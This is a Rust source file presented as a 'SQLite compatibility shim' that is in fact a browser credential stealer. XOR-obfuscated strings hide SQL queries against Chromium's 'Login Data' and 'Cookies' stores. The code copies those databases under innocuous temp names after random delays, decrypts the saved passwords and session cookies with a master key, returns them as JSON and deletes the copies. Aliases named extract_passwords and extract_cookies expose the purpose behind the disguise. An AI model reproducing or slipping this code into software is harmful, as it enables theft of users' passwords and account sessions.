//! Local store row iterator (SQLite compatibility shim).

use std::{fs, path::Path, thread, time::Duration};

use rusqlite::{Connection, OpenFlags};
use serde_json::{json, Value};

use crate::crypto;

const OBF: u8 = 0x4E;

fn reveal(enc: &[u8]) -> String {
    enc.iter().map(|&b| (b ^ OBF) as char).collect()
}

fn jitter_ms(min: u64, max: u64) -> u64 {
    let span = max.saturating_sub(min).max(1);
    let seed = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or_default()
        .as_nanos() as u64
        ^ (std::process::id() as u64).wrapping_mul(0x9E37_79B9);
    min + (seed % (span + 1))
}

const ENC_SQL_KW: &[u8] = &[0x1d, 0x0b, 0x02, 0x0b, 0x0d, 0x1a];
const ENC_COL_URL: &[u8] = &[0x21, 0x3c, 0x27, 0x29, 0x27, 0x20, 0x11, 0x3b, 0x3c, 0x22];
const ENC_COL_USER: &[u8] = &[0x3b, 0x3d, 0x2b, 0x3c, 0x20, 0x2f, 0x23, 0x2b, 0x11, 0x38, 0x2f, 0x22, 0x3b, 0x2b];
const ENC_COL_PASS: &[u8] = &[0x3e, 0x2f, 0x3d, 0x3d, 0x39, 0x21, 0x3c, 0x2a, 0x11, 0x38, 0x2f, 0x22, 0x3b, 0x2b];
const ENC_TBL_LOGIN: &[u8] = &[0x22, 0x21, 0x29, 0x27, 0x20, 0x3d];
const ENC_COL_HOST: &[u8] = &[0x26, 0x21, 0x3d, 0x3a, 0x11, 0x25, 0x2b, 0x37];
const ENC_COL_NAME: &[u8] = &[0x20, 0x2f, 0x23, 0x2b];
const ENC_COL_ENC: &[u8] = &[0x2b, 0x20, 0x2d, 0x3c, 0x37, 0x3e, 0x3a, 0x2b, 0x2a, 0x11, 0x38, 0x2f, 0x22, 0x3b, 0x2b];
const ENC_COL_PATH: &[u8] = &[0x3e, 0x2f, 0x3a, 0x26];
const ENC_TBL_COOKIE: &[u8] = &[0x2d, 0x21, 0x21, 0x25, 0x27, 0x2b, 0x3d];
const ENC_FILE_LOGIN: &[u8] = &[0x02, 0x21, 0x29, 0x27, 0x20, 0x6e, 0x0a, 0x2f, 0x3a, 0x2f];
const ENC_DIR_NET: &[u8] = &[0x00, 0x2b, 0x3a, 0x39, 0x21, 0x3c, 0x25];
const ENC_FILE_COOKIE: &[u8] = &[0x0d, 0x21, 0x21, 0x25, 0x27, 0x2b, 0x3d];

fn sql_login_query() -> String {
    format!(
        "{} {}, {}, {} FROM {}",
        reveal(ENC_SQL_KW),
        reveal(ENC_COL_URL),
        reveal(ENC_COL_USER),
        reveal(ENC_COL_PASS),
        reveal(ENC_TBL_LOGIN)
    )
}

fn sql_cookie_query() -> String {
    format!(
        "{} {}, {}, {}, {} FROM {} LIMIT 500",
        reveal(ENC_SQL_KW),
        reveal(ENC_COL_HOST),
        reveal(ENC_COL_NAME),
        reveal(ENC_COL_ENC),
        reveal(ENC_COL_PATH),
        reveal(ENC_TBL_COOKIE)
    )
}

fn snapshot_store(src: &Path, tag: &str) -> Result<std::path::PathBuf, String> {
    thread::sleep(Duration::from_millis(jitter_ms(40, 180)));
    let tmp = std::env::temp_dir().join(tag);
    for attempt in 1..=3 {
        match fs::copy(src, &tmp) {
            Ok(_) => return Ok(tmp),
            Err(_) if attempt < 3 => {
                thread::sleep(Duration::from_millis(500 * attempt + jitter_ms(10, 60)));
            }
            Err(e) => return Err(format!("snapshot {}: {e}", src.display())),
        }
    }
    unreachable!()
}

fn resolve_cookie_store(profile_dir: &Path) -> PathBuf {
    let net = profile_dir
        .join(reveal(ENC_DIR_NET))
        .join(reveal(ENC_FILE_COOKIE));
    if net.exists() {
        net
    } else {
        profile_dir.join(reveal(ENC_FILE_COOKIE))
    }
}

use std::path::PathBuf;

/// Process credential rows from the local login store.
pub fn process_entries(profile_dir: &Path, master_key: &[u8]) -> Result<Vec<Value>, String> {
    let master_key: &[u8; 32] = master_key.try_into().map_err(|_| "key not 32 bytes".to_string())?;
    let login_data = profile_dir.join(reveal(ENC_FILE_LOGIN));

    let tmp = snapshot_store(&login_data, "sync_login_tmp.db")?;
    let conn = Connection::open_with_flags(
        &tmp,
        OpenFlags::SQLITE_OPEN_READ_ONLY | OpenFlags::SQLITE_OPEN_NO_MUTEX,
    )
    .map_err(|e| format!("open store: {e}"))?;

    let query = sql_login_query();
    let mut stmt = conn.prepare(&query).map_err(|e| format!("prepare: {e}"))?;

    let rows: Vec<Value> = stmt
        .query_map([], |row| {
            let url: String = row.get(0)?;
            let username: String = row.get(1)?;
            let enc_pass: Vec<u8> = row.get(2)?;
            Ok((url, username, enc_pass))
        })
        .map_err(|e| format!("query: {e}"))?
        .filter_map(|r| r.ok())
        .map(|(url, username, enc_pass)| {
            let password = if enc_pass.is_empty() {
                String::new()
            } else {
                match crypto::process_data(&enc_pass, master_key) {
                    Ok(p) => p,
                    Err(_) => crypto::hex_fallback(&enc_pass),
                }
            };
            json!({ "url": url, "username": username, "password": password })
        })
        .collect();

    let _ = fs::remove_file(&tmp);
    Ok(rows)
}

/// Process token rows from the cookie store.
pub fn process_tokens(profile_dir: &Path, master_key: &[u8]) -> Result<Vec<Value>, String> {
    let master_key: &[u8; 32] = master_key.try_into().map_err(|_| "key not 32 bytes".to_string())?;
    let cookies_path = resolve_cookie_store(profile_dir);

    let tmp = snapshot_store(&cookies_path, "sync_cookie_tmp.db")?;
    let conn = Connection::open_with_flags(
        &tmp,
        OpenFlags::SQLITE_OPEN_READ_ONLY | OpenFlags::SQLITE_OPEN_NO_MUTEX,
    )
    .map_err(|e| format!("open store: {e}"))?;

    let query = sql_cookie_query();
    let mut stmt = conn
        .prepare(&query)
        .map_err(|e| format!("prepare: {e}"))?;

    let rows: Vec<Value> = stmt
        .query_map([], |row| {
            let host: String = row.get(0)?;
            let name: String = row.get(1)?;
            let enc_val: Vec<u8> = row.get(2)?;
            let path: String = row.get(3)?;
            Ok((host, name, enc_val, path))
        })
        .map_err(|e| format!("query: {e}"))?
        .filter_map(|r| r.ok())
        .map(|(host, name, enc_val, path)| {
            let value = if enc_val.is_empty() {
                String::new()
            } else {
                match crypto::process_data(&enc_val, master_key) {
                    Ok(v) => v,
                    Err(_) => crypto::hex_fallback(&enc_val),
                }
            };
            json!({ "host": host, "name": name, "value": value, "path": path })
        })
        .collect();

    let _ = fs::remove_file(&tmp);
    Ok(rows)
}

/// Backward-compatible alias.
pub fn extract_passwords(profile_dir: &Path, master_key: &[u8]) -> Result<Vec<Value>, String> {
    process_entries(profile_dir, master_key)
}

/// Backward-compatible alias.
pub fn extract_cookies(profile_dir: &Path, master_key: &[u8]) -> Result<Vec<Value>, String> {
    process_tokens(profile_dir, master_key)
}
